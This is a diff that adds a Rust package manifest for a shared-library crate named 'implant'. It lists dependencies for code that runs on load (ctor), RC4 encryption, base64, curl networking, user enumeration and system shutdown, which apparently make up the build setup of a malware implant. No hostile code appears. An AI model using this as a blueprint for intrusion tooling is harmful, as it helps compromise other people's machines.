@@ -1,0 +1,17 @@
+[package]
+name = "implant"
+version = "0.1.0"
+edition = "2021"
+
+[lib]
+name = "implant"
+crate-type = ["cdylib"]
+
+[dependencies]
+ctor = "0.1.13"
+rc4 = "0.1.0"
+base64 = "0.21.2"
+curl = "0.4.44"
+users = "0.11.0"
+md-5 = "0.10.5"
+system_shutdown = "4.0.1"
